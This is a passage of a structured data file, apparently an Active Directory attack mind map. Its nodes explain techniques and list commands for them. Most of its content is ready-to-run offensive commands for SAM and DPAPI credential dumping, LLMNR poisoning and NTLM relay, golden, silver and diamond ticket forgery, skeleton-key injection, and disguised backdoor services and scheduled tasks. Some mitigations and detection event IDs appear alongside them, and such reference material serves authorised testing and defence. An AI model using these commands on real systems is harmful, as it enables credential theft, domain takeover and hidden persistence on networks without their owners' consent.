                                    label: 'SAM Database Extraction',
                                    description: 'Local account hashes',
                                    descriptionMd: '### SAM Database Credential Extraction\nExtract local account password hashes from the Security Account Manager (SAM) database.\n\nSAM Database Location:\n* File: C:\Windows\System32\config\SAM\n* Registry: HKLM\SAM\n* Protected by SYSTEM account permissions\n* Requires SYSTEM key for decryption\n\nExtraction Methods:\n* Registry hive export\n* Volume Shadow Copy access\n* Offline disk mount\n* Impacket secretsdump\n\nUse Cases:\n* Local administrator password audit\n* Credential reuse assessment\n* Pass-the-hash material\n* Offline cracking\n',
                                    commands: [{
                                            description: 'Registry save method',
                                            code: 'reg save HKLM\SAM sam.sav\nreg save HKLM\SYSTEM system.sav'
                                        },
                                        {
                                            description: 'Secretsdump local',
                                            code: 'secretsdump.py -sam sam.sav -system system.sav LOCAL'
                                        },
                                        {
                                            description: 'Secretsdump remote',
                                            code: 'secretsdump.py domain/user:password@TARGET'
                                        },
                                        {
                                            description: 'CrackMapExec SAM',
                                            code: 'crackmapexec smb TARGET -u user -p password --sam'
                                        },
                                        {
                                            description: 'Mimikatz SAM',
                                            code: 'lsadump::sam /system:system.sav /sam:sam.sav'
                                        },
                                        {
                                            description: 'VSS copy method',
                                            code: 'vssadmin create shadow /for=C:\ncopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\ncopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🗄️',
                                    resources: [{
                                            title: 'SAM Database Extraction',
                                            url: 'https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry'
                                        },
                                        {
                                            title: 'Volume Shadow Copy Attacks',
                                            url: 'https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'dpapi-abuse',
                                data: {
                                    label: 'DPAPI Credential Extraction',
                                    description: 'Decrypt protected data',
                                    descriptionMd: '### Data Protection API (DPAPI) Abuse\nExtract and decrypt credentials protected by Windows Data Protection API, including Chrome passwords, Wi-Fi passwords, and more.\n\nDPAPI Protected Data:\n* Browser saved passwords (Chrome, Edge)\n* Windows Credential Manager\n* Wi-Fi passwords\n* RDP credentials\n* Outlook passwords\n* Certificate private keys\n\nAttack Requirements:\n* User\'s master key (derived from password)\n* Or DPAPI backup keys (requires domain admin)\n* Access to encrypted blob\n\nMaster Key Locations:\n* %APPDATA%\Microsoft\Protect\{SID}\\n* Domain backup keys in domain controller\n',
                                    commands: [{
                                            description: 'Mimikatz DPAPI masterkeys',
                                            code: 'sekurlsa::dpapi'
                                        },
                                        {
                                            description: 'Decrypt Chrome passwords',
                                            code: 'dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"'
                                        },
                                        {
                                            description: 'SharpChrome',
                                            code: 'SharpChrome.exe logins /unprotect'
                                        },
                                        {
                                            description: 'SharpDPAPI triage',
                                            code: 'SharpDPAPI.exe triage'
                                        },
                                        {
                                            description: 'SharpDPAPI credentials',
                                            code: 'SharpDPAPI.exe credentials'
                                        },
                                        {
                                            description: 'Extract Wi-Fi passwords',
                                            code: 'netsh wlan show profiles\nnetsh wlan show profile name="SSID" key=clear'
                                        },
                                        {
                                            description: 'DonPAPI (Impacket)',
                                            code: 'DonPAPI.py domain/user:password@TARGET'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔓',
                                    resources: [{
                                            title: 'DPAPI Secrets',
                                            url: 'https://www.passcape.com/index.php?section=docsys&cmd=details&id=28'
                                        },
                                        {
                                            title: 'SharpDPAPI',
                                            url: 'https://github.com/GhostPack/SharpDPAPI'
                                        },
                                        {
                                            title: 'DonPAPI Tool',
                                            url: 'https://github.com/login-securite/DonPAPI'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'name-resolution',
                        data: {
                            label: 'Name Resolution Risks',
                            description: 'LLMNR/NBT-NS/WPAD posture',
                            descriptionMd: '### Name Resolution Protocol Abuse\nAssess whether legacy name resolution features increase credential exposure and whether mitigations are enforced.\n\nVulnerable Protocols:\n* LLMNR (Link-Local Multicast Name Resolution): UDP 5355\n* NBT-NS (NetBIOS Name Service): UDP 137\n* WPAD (Web Proxy Auto-Discovery): DHCP option 252, DNS\n* mDNS (Multicast DNS): UDP 5353\n\nAttack Mechanism:\n1. User/system requests non-existent hostname\n2. DNS fails to resolve\n3. System falls back to LLMNR/NBT-NS broadcast\n4. Attacker responds to broadcast\n5. Victim attempts authentication to attacker\n6. Attacker captures NTLMv2 hash\n\nImpact:\n* Passive credential capture\n* NTLMv2 hash cracking\n* Relay to other services\n* Works without any privileges\n\nMitigations:\n* Disable LLMNR via GPO\n* Disable NBT-NS via GPO or DHCP\n* Enable SMB signing\n* Enforce strong passwords\n',
                            commands: [{
                                    description: 'Responder poisoning',
                                    code: 'responder -I eth0 -wrf'
                                },
                                {
                                    description: 'Responder analyze mode',
                                    code: 'responder -I eth0 -A'
                                },
                                {
                                    description: 'Inveigh (PowerShell)',
                                    code: 'Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788'
                                },
                                {
                                    description: 'Inveigh relay',
                                    code: 'Invoke-InveighRelay -ConsoleOutput Y -Target TARGET-IP'
                                },
                                {
                                    description: 'ntlmrelayx to SMB',
                                    code: 'ntlmrelayx.py -t smb://TARGET -smb2support'
                                },
                                {
                                    description: 'Check LLMNR enabled',
                                    code: 'Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast'
                                },
                                {
                                    description: 'Disable LLMNR (local)',
                                    code: 'New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0 -PropertyType DWord'
                                }
                            ],
                            type: 'technique',
                            emoji: '📡',
                            resources: [{
                                    title: 'Responder Tool',
                                    url: 'https://github.com/lgandx/Responder'
                                },
                                {
                                    title: 'Inveigh',
                                    url: 'https://github.com/Kevin-Robertson/Inveigh'
                                },
                                {
                                    title: 'LLMNR/NBT-NS Poisoning',
                                    url: 'https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning'
                                }
                            ]
                        },
                        children: [{
                                id: 'ntlm-relay',
                                data: {
                                    label: 'NTLM Relay Attacks',
                                    description: 'Relay captured authentication',
                                    descriptionMd: '### NTLM Relay Attacks\nRelay captured NTLM authentication to other services instead of cracking the hash.\n\nRelay Targets:\n* SMB shares (if signing disabled)\n* HTTP/HTTPS services\n* LDAP/LDAPS (change passwords, create computers)\n* MSSQL\n* SMTP\n* ADCS web enrollment (ESC8)\n\nRequirements:\n* Target must not require signing OR\n* Cross-protocol relay (SMB → HTTP)\n* Captured account must have privileges on target\n\nAttack Chains:\n* LLMNR → Capture → Relay to SMB → Command execution\n* LLMNR → Capture → Relay to LDAPS → Create computer account\n* PetitPotam → Relay to ADCS → Certificate → Domain Admin\n\nMitigations:\n* Enable SMB signing (required, not just enabled)\n* Enable LDAP signing and channel binding\n* Disable NTLM where possible\n',
                                    commands: [{
                                            description: 'ntlmrelayx to SMB',
                                            code: 'ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"'
                                        },
                                        {
                                            description: 'Relay to multiple targets',
                                            code: 'ntlmrelayx.py -tf targets.txt -smb2support'
                                        },
                                        {
                                            description: 'Relay to LDAPS',
                                            code: 'ntlmrelayx.py -t ldaps://DC-IP --escalate-user lowpriv'
                                        },
                                        {
                                            description: 'Relay with socks',
                                            code: 'ntlmrelayx.py -tf targets.txt -smb2support -socks'
                                        },
                                        {
                                            description: 'Relay to ADCS',
                                            code: 'ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController'
                                        },
                                        {
                                            description: 'MultiRelay (Responder)',
                                            code: 'MultiRelay.py -t TARGET -u ALL'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔁',
                                    resources: [{
                                            title: 'NTLM Relay Guide',
                                            url: 'https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html'
                                        },
                                        {
                                            title: 'Relay Attacks Deep Dive',
                                            url: 'https://www.secureauth.com/blog/playing-relayed-credentials/'
                                        },
                                        {
                                            title: 'Drop the MIC Attack',
                                            url: 'https://www.preempt.com/blog/drop-the-mic-cve-2019-1040/'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'wpad-abuse',
                                data: {
                                    label: 'WPAD Injection',
                                    description: 'Proxy auto-config poisoning',
                                    descriptionMd: '### WPAD (Web Proxy Auto-Discovery) Abuse\nPoison WPAD responses to intercept HTTP/HTTPS traffic and capture credentials.\n\nWPAD Discovery Methods:\n1. DHCP Option 252\n2. DNS query for wpad.domain.com\n3. LLMNR/NBT-NS query for "WPAD"\n\nAttack Flow:\n1. Respond to WPAD discovery request\n2. Serve malicious PAC (Proxy Auto-Config) file\n3. Direct victim traffic through attacker proxy\n4. Capture authentication or perform MITM\n\nCaptured Data:\n* NTLM authentication to proxy\n* HTTP Basic authentication\n* Cleartext HTTP traffic\n* Certificate acceptance (HTTPS MITM)\n\nDefenses:\n* Block WPAD via DNS\n* Disable WPAD in browsers\n* Use explicit proxy configuration\n',
                                    commands: [{
                                            description: 'Responder with WPAD',
                                            code: 'responder -I eth0 -wF'
                                        },
                                        {
                                            description: 'Serve malicious PAC',
                                            code: 'responder -I eth0 -w -F --lm'
                                        },
                                        {
                                            description: 'Check WPAD DNS entry',
                                            code: 'nslookup wpad.domain.com'
                                        },
                                        {
                                            description: 'Disable WPAD (registry)',
                                            code: 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" /v WpadOverride /t REG_DWORD /d 1'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🌐',
                                    resources: [{
                                            title: 'WPAD Attacks',
                                            url: 'https://www.netspi.com/blog/technical/network-penetration-testing/wpad-man-in-the-middle/'
                                        },
                                        {
                                            title: 'Responder WPAD',
                                            url: 'https://github.com/lgandx/Responder'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    }
                ]
            },

            {
                id: 'ad-persist',
                data: {
                    label: 'Persistence',
                    description: 'Keep Access',
                    descriptionMd: '### Persistence in Active Directory\nEvaluate common persistence classes to verify detection coverage and hardening, then ensure clean rollback.\n\n**Persistence Objectives:**\n* Maintain access after initial compromise\n* Survive password changes and system reboots\n* Provide multiple independent access paths\n* Operate covertly to avoid detection\n* Ensure access even if primary method is discovered\n\n**Persistence Categories:**\n* **Credential-based**: Golden/Silver tickets, skeleton keys\n* **Access-based**: ACL backdoors, GPO modifications\n* **Certificate-based**: Forged certificates, rogue CAs\n* **Trust-based**: SID history, domain trust abuse\n* **Service-based**: Malicious services, scheduled tasks\n\n**Detection Considerations:**\n* SIEM alerting on persistence indicators\n* Regular ACL audits\n* GPO change monitoring\n* Certificate transparency logs\n* KRBTGT password rotation schedule\n',
                    commands: [],
                    type: 'category',
                    emoji: '🔁',
                    resources: [{
                            title: 'AD Persistence Techniques',
                            url: 'https://adsecurity.org/?p=1929'
                        },
                        {
                            title: 'Persistence Detection',
                            url: 'https://github.com/SigmaHQ/sigma/tree/master/rules/windows'
                        }
                    ]
                },
                children: [{
                        id: 'ticket-persist',
                        data: {
                            label: 'Kerberos Ticket Risk',
                            description: 'Long-lived trust artifacts',
                            descriptionMd: '### Kerberos Ticket Persistence\nTreat ticket-forgery and long-lived ticket risks as "domain control" class issues; focus on KRBTGT hygiene, tiering, and monitoring.\n\n**Ticket-Based Persistence Types:**\n* **Golden Ticket**: Forged TGT using KRBTGT hash\n* **Silver Ticket**: Forged service ticket using service account hash\n* **Diamond Ticket**: Modified legitimate TGT (harder to detect)\n* **Sapphire Ticket**: Exploits S4U2self delegation\n\n**Persistence Duration:**\n* Golden Ticket: Up to 10 years (configurable)\n* Silver Ticket: Limited to service account password change\n* Survives password resets of target accounts\n* Only removed by KRBTGT password rotation (Golden) or service account rotation (Silver)\n\n**Detection Challenges:**\n* Encrypted ticket content\n* Appears as legitimate Kerberos traffic\n* Golden tickets bypass normal domain authentication\n* May not generate expected authentication logs\n',
                            commands: [{
                                    description: 'Extract KRBTGT hash',
                                    code: 'lsadump::dcsync /domain:domain.com /user:krbtgt'
                                },
                                {
                                    description: 'Create Golden Ticket',
                                    code: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /id:500 /ptt'
                                },
                                {
                                    description: 'Golden Ticket with custom lifetime',
                                    code: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /user:fakeuser /id:1337 /startoffset:0 /endin:43200 /renewmax:10080 /ptt'
                                },
                                {
                                    description: 'Impacket Golden Ticket',
                                    code: 'ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.com Administrator'
                                },
                                {
                                    description: 'Rubeus Golden Ticket',
                                    code: 'Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.com /sid:S-1-5-21-... /user:Administrator /ptt'
                                }
                            ],
                            type: 'technique',
                            emoji: '🎟️',
                            resources: [{
                                    title: 'Golden Ticket Deep Dive',
                                    url: 'https://adsecurity.org/?p=1640'
                                },
                                {
                                    title: 'Detecting Forged Tickets',
                                    url: 'https://adsecurity.org/?p=1515'
                                },
                                {
                                    title: 'Diamond Ticket',
                                    url: 'https://www.secureauth.com/blog/kerberos-diamond-tickets/'
                                }
                            ]
                        },
                        children: [{
                                id: 'golden-ticket',
                                data: {
                                    label: 'Golden Ticket',
                                    description: 'Forged TGT persistence',
                                    descriptionMd: '### Golden Ticket Attack\nForge Ticket Granting Tickets (TGTs) using the KRBTGT account hash, providing complete domain persistence.\n\n**Requirements:**\n* KRBTGT account NTLM hash or AES key\n* Domain SID\n* Domain name\n\n**Advantages:**\n* Complete domain access\n* Survives all password changes except KRBTGT\n* Can impersonate any user (including non-existent)\n* Bypasses smartcard/MFA requirements\n* Can set arbitrary group memberships\n* Custom ticket lifetime (default 10 years)\n\n**Operational Notes:**\n* Create tickets with realistic lifetimes to avoid detection\n* Use legitimate user accounts when possible\n* Consider using AES keys instead of RC4 for better OPSEC\n* Tickets can be created offline\n\n**Mitigation:**\n* Rotate KRBTGT password twice (wait 10 hours between)\n* Implement anomaly detection for unusual ticket requests\n* Monitor for tickets with unusual lifetimes\n* Enable PAC validation\n',
                                    commands: [{
                                            description: 'Mimikatz Golden Ticket',
                                            code: 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /krbtgt:NTHASH /id:500 /groups:512,513,518,519,520 /ptt'
                                        },
                                        {
                                            description: 'Golden Ticket with AES',
                                            code: 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /aes256:AES_KEY /id:500 /ptt'
                                        },
                                        {
                                            description: 'Export Golden Ticket',
                                            code: 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /krbtgt:NTHASH /ticket:golden.kirbi'
                                        },
                                        {
                                            description: 'Rubeus Golden Ticket',
                                            code: 'Rubeus.exe golden /rc4:KRBTGT_HASH /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /nowrap /ptt'
                                        },
                                        {
                                            description: 'Impacket Golden Ticket',
                                            code: 'ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID -domain domain.com -user-id 500 Administrator'
                                        },
                                        {
                                            description: 'Use ticket (Linux)',
                                            code: 'export KRB5CCNAME=Administrator.ccache; psexec.py domain.com/Administrator@target -k -no-pass'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '👑',
                                    resources: [{
                                            title: 'Golden Ticket Explained',
                                            url: 'https://adsecurity.org/?p=1640'
                                        },
                                        {
                                            title: 'KRBTGT Rotation Process',
                                            url: 'https://github.com/microsoft/New-KrbtgtKeys.ps1'
                                        },
                                        {
                                            title: 'Detecting Golden Tickets',
                                            url: 'https://www.hub.trimarcsecurity.com/post/detecting-kerberoasting-activity'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'silver-ticket',
                                data: {
                                    label: 'Silver Ticket',
                                    description: 'Forged service ticket persistence',
                                    descriptionMd: '### Silver Ticket Attack\nForge service tickets (TGS) using service account hashes, providing targeted persistence without needing KRBTGT.\n\n**Requirements:**\n* Service account NTLM hash or AES key\n* Domain SID\n* Service Principal Name (SPN)\n* Target service name\n\n**Advantages over Golden Ticket:**\n* Stealthier (no TGT request to DC)\n* Service-specific access\n* Lower detection profile\n* Easier to obtain (service hash vs KRBTGT)\n* No KDC interaction after creation\n\n**Target Services:**\n* **CIFS**: File access, remote admin\n* **HOST**: PSExec, scheduled tasks, WMI\n* **HTTP**: Web services, APIs\n* **MSSQL**: Database access\n* **LDAP**: Directory queries\n* **WSMAN**: PowerShell remoting\n\n**Limitations:**\n* Limited to specific service\n* Expires with service account password change\n* No PAC validation by most services\n',
                                    commands: [{
                                            description: 'Silver Ticket for CIFS',
                                            code: 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /target:server.domain.com /service:cifs /rc4:SERVICE_HASH /id:500 /ptt'
                                        },
                                        {
                                            description: 'Silver Ticket for HOST',
                                            code: 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /target:server.domain.com /service:host /rc4:MACHINE_HASH /ptt'
                                        },
                                        {
                                            description: 'Rubeus Silver Ticket',
                                            code: 'Rubeus.exe silver /service:cifs/server.domain.com /rc4:SERVICE_HASH /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /ptt'
                                        },
                                        {
                                            description: 'Impacket Silver Ticket',
                                            code: 'ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-DOMAIN-SID -domain domain.com -spn cifs/server.domain.com Administrator'
                                        },
                                        {
                                            description: 'Multiple services',
                                            code: 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /target:server.domain.com /service:cifs /rc4:HASH /ptt\nkerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /target:server.domain.com /service:host /rc4:HASH /ptt'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🥈',
                                    resources: [{
                                            title: 'Silver Ticket Guide',
                                            url: 'https://adsecurity.org/?p=2011'
                                        },
                                        {
                                            title: 'Service Ticket Forgery',
                                            url: 'https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'diamond-ticket',
                                data: {
                                    label: 'Diamond Ticket',
                                    description: 'Modified legitimate TGT',
                                    descriptionMd: '### Diamond Ticket Attack\nModify a legitimate TGT obtained through normal authentication, making detection significantly harder than Golden Tickets.\n\n**How It Works:**\n1. Request legitimate TGT through normal authentication\n2. Decrypt TGT using KRBTGT key\n3. Modify PAC (Privilege Attribute Certificate)\n4. Re-encrypt with KRBTGT key\n5. Use modified ticket\n\n**Advantages:**\n* Based on legitimate TGT (proper encryption, timestamps)\n* Passes many Golden Ticket detection mechanisms\n* Includes legitimate session key\n* Proper ticket structure and fields\n* Can add arbitrary group memberships\n\n**Detection Challenges:**\n* Appears as legitimate Kerberos ticket\n* Correct encryption and ticket structure\n* Normal ticket request patterns\n* Bypasses many SIEM detections for forged tickets\n\n**Requirements:**\n* KRBTGT hash (like Golden Ticket)\n* Ability to request legitimate TGT\n* Rubeus or similar tool supporting Diamond Tickets\n',
                                    commands: [{
                                            description: 'Rubeus Diamond Ticket',
                                            code: 'Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:KRBTGT_AES_KEY /ptt'
                                        },
                                        {
                                            description: 'Diamond with credentials',
                                            code: 'Rubeus.exe diamond /user:lowpriv /password:pass /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_KEY /ptt'
                                        },
                                        {
                                            description: 'Diamond with hash',
                                            code: 'Rubeus.exe diamond /user:lowpriv /rc4:HASH /ticketuser:Administrator /groups:512,518,519,520 /krbkey:KRBTGT_KEY /ptt'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '💎',
                                    resources: [{
                                            title: 'Diamond Ticket Research',
                                            url: 'https://www.secureauth.com/blog/kerberos-diamond-tickets/'
                                        },
                                        {
                                            title: 'Rubeus Diamond Implementation',
                                            url: 'https://github.com/GhostPack/Rubeus'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'skeleton-key',
                                data: {
                                    label: 'Skeleton Key',
                                    description: 'Domain controller backdoor',
                                    descriptionMd: '### Skeleton Key Attack\nPatch the LSASS process on domain controllers to accept a master password for any account while maintaining normal authentication.\n\n**How It Works:**\n* Patches Domain Controller LSASS memory\n* Allows authentication with skeleton key password for ANY account\n* Normal passwords continue to work\n* Transparent to users\n* Survives until DC reboot\n\n**Requirements:**\n* Domain Admin or equivalent privileges\n* Direct access to Domain Controller\n* Ability to inject into LSASS\n\n**Advantages:**\n* Authenticate as any user\n* Normal authentication still works (hard to detect)\n* No ticket forgery needed\n* Works with all Kerberos and NTLM auth\n\n**Limitations:**\n* Removed on DC reboot\n* Requires DA to install\n* Detectable by memory analysis\n* High-risk operation (patches LSASS)\n\n**Mitigations:**\n* Protected Process Light (PPL) for LSASS\n* Credential Guard\n* Regular DC reboots\n* Memory integrity checks\n',
                                    commands: [{
                                            description: 'Install Skeleton Key',
                                            code: 'privilege::debug\nmisc::skeleton'
                                        },
                                        {
                                            description: 'Authenticate with skeleton key',
                                            code: 'net use \\\\DC\\C$ /user:domain\\Administrator mimikatz'
                                        },
                                        {
                                            description: 'PSExec with skeleton key',
                                            code: 'PsExec.exe \\\\DC -u domain\\Administrator -p mimikatz cmd'
                                        },
                                        {
                                            description: 'RDP with skeleton key',
                                            code: 'mstsc /v:DC /u:Administrator (password: mimikatz)'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '☠️',
                                    resources: [{
                                            title: 'Skeleton Key Malware',
                                            url: 'https://www.secureworks.com/research/skeleton-key-malware-analysis'
                                        },
                                        {
                                            title: 'Detection Methods',
                                            url: 'https://adsecurity.org/?p=1275'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'service-accounts',
                        data: {
                            label: 'Service Accounts',
                            description: 'Credential governance',
                            descriptionMd: '### Service Account Persistence\nAssess rotation, gMSA adoption, least privilege, and whether service identities are overused across hosts.\n\n**Service Account Risks:**\n* Rarely changed passwords\n* Often over-privileged (Domain Admin)\n* Reused across multiple systems\n* Credentials stored in memory\n* Scheduled tasks and services\n\n**Persistence Vectors:**\n* Service account Kerberoasting\n* Silver tickets for service accounts\n* Credential theft from services\n* Scheduled task manipulation\n* Service binary replacement\n\n**Hardening Checks:**\n* gMSA (Group Managed Service Account) adoption\n* Password rotation policies\n* Least privilege enforcement\n* Service account usage monitoring\n* Credential exposure on endpoints\n',
                            commands: [{
                                    description: 'Enumerate service accounts',
                                    code: 'Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName,PasswordLastSet,PasswordNeverExpires'
                                },
                                {
                                    description: 'Find privileged service accounts',
                                    code: 'Get-ADUser -Filter {ServicePrincipalName -like "*"} | ForEach-Object {Get-ADPrincipalGroupMembership $_.SamAccountName | Where-Object {$_.Name -like "*admin*"}}'
                                },
                                {
                                    description: 'Check gMSA usage',
                                    code: 'Get-ADServiceAccount -Filter *'
                                },
                                {
                                    description: 'Services running as domain accounts',
                                    code: 'Get-WmiObject Win32_Service | Where-Object {$_.StartName -like "*@*" -or $_.StartName -like "domain\\*"} | Select Name,StartName,State'
                                },
                                {
                                    description: 'Scheduled tasks with credentials',
                                    code: 'Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "SYSTEM" -and $_.Principal.UserId -ne $null} | Select TaskName,TaskPath,Principal'
                                }
                            ],
                            type: 'technique',
                            emoji: '🔑',
                            resources: [{
                                    title: 'gMSA Security',
                                    url: 'https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview'
                                },
                                {
                                    title: 'Service Account Hardening',
                                    url: 'https://adsecurity.org/?p=2288'
                                }
                            ]
                        },
                        children: [{
                                id: 'scheduled-task-persist',
                                data: {
                                    label: 'Scheduled Task Persistence',
                                    description: 'Task-based backdoors',
                                    descriptionMd: '### Scheduled Task Persistence\nCreate scheduled tasks for persistent access, especially using service account credentials.\n\n**Persistence Methods:**\n* Local scheduled task (requires local admin)\n* Domain-level scheduled task\n* GPO-deployed scheduled task\n* Hidden scheduled task\n\n**Triggers:**\n* System startup\n* User logon\n* Specific time/interval\n* Event-based triggers\n* Idle time\n\n**Advantages:**\n* Native Windows feature\n* Multiple trigger options\n* Can run with elevated privileges\n* Survives reboots\n\n**Detection:**\n* Event ID 4698 (task created)\n* Event ID 4702 (task updated)\n* Event ID 4699 (task deleted)\n* Event ID 4700/4701 (task enabled/disabled)\n',
                                    commands: [{
                                            description: 'Create scheduled task',
                                            code: 'schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -enc <payload>" /sc daily /st 09:00 /ru SYSTEM'
                                        },
                                        {
                                            description: 'Create task at startup',
                                            code: 'schtasks /create /tn "SystemCheck" /tr "C:\\temp\\backdoor.exe" /sc onstart /ru SYSTEM'
                                        },
                                        {
                                            description: 'Create task on logon',
                                            code: 'schtasks /create /tn "UserInit" /tr "cmd.exe /c start /min backdoor.exe" /sc onlogon /ru domain\\user /rp password'
                                        },
                                        {
                                            description: 'Remote task creation',
                                            code: 'schtasks /create /s TARGET /u domain\\admin /p password /tn "Maintenance" /tr "powershell.exe -w hidden -enc <payload>" /sc daily /st 14:00'
                                        },
                                        {
                                            description: 'PowerShell scheduled task',
                                            code: '$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc <payload>"\n$trigger = New-ScheduledTaskTrigger -AtStartup\n$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount\nRegister-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger -Principal $principal'
                                        },
                                        {
                                            description: 'List scheduled tasks',
                                            code: 'schtasks /query /fo LIST /v'
                                        },
                                        {
                                            description: 'Hidden task (COM)',
                                            code: 'Get-ScheduledTask | Where-Object {$_.Settings.Hidden -eq $true}'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '⏲️',
                                    resources: [{
                                            title: 'Scheduled Task Persistence',
                                            url: 'https://attack.mitre.org/techniques/T1053/005/'
                                        },
                                        {
                                            title: 'Detecting Malicious Tasks',
                                            url: 'https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4698'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'service-persist',
                                data: {
                                    label: 'Service Persistence',
                                    description: 'Windows service backdoors',
                                    descriptionMd: '### Windows Service Persistence\nCreate or modify Windows services for persistent access with SYSTEM or elevated privileges.\n\n**Service Persistence Types:**\n* Create new service\n* Modify existing service binary path\n* Service DLL hijacking\n* Service Failure Recovery (execute on failure)\n\n**Start Types:**\n* **Automatic**: Starts at boot\n* **Automatic (Delayed Start)**: Starts after boot (stealthier)\n* **Manual**: Started on demand\n* **Boot/System**: Kernel/driver services\n\n**Advantages:**\n* Runs as SYSTEM (by default)\n* Starts automatically\n* Survives reboots\n* Native Windows functionality\n\n**Detection:**\n* Event ID 7045 (service installed)\n* Event ID 7040 (service start type changed)\n* Unusual service names or paths\n* Services without descriptions\n',
                                    commands: [{
                                            description: 'Create service',
                                            code: 'sc create "WindowsDefender" binPath= "C:\\temp\\backdoor.exe" start= auto DisplayName= "Windows Defender Service"'
                                        },
                                        {
                                            description: 'Create service as SYSTEM',
                                            code: 'sc create BackdoorSvc binPath= "cmd.exe /c powershell.exe -enc <payload>" start= auto obj= LocalSystem'
                                        },
                                        {
                                            description: 'Remote service creation',
                                            code: 'sc \\\\TARGET create BackdoorSvc binPath= "C:\\temp\\backdoor.exe" start= auto'
                                        },
                                        {
                                            description: 'Modify existing service',
                                            code: 'sc config ExistingService binPath= "cmd.exe /c C:\\backdoor.exe & C:\\Windows\\System32\\legit.exe"'
                                        },
                                        {
                                            description: 'Service failure recovery',
                                            code: 'sc failure ServiceName reset= 86400 actions= run/5000 command= "C:\\temp\\backdoor.exe"'
                                        },
                                        {
                                            description: 'PowerShell new service',
                                            code: 'New-Service -Name "UpdateService" -BinaryPathName "C:\\temp\\backdoor.exe" -DisplayName "System Update Service" -StartupType Automatic'
                                        },
                                        {
                                            description: 'Check service permissions',
                                            code: 'sc sdshow ServiceName'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '⚙️',
                                    resources: [{
                                            title: 'Service Persistence',
                                            url: 'https://attack.mitre.org/techniques/T1543/003/'
                                        },
                                        {
                                            title: 'Service Security',
                                            url: 'https://www.sans.org/blog/windows-services-security/'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'adcs-persist',
                        data: {
                            label: 'Certificate Persistence',
                            description: 'Abuse of enrollment/issuance',
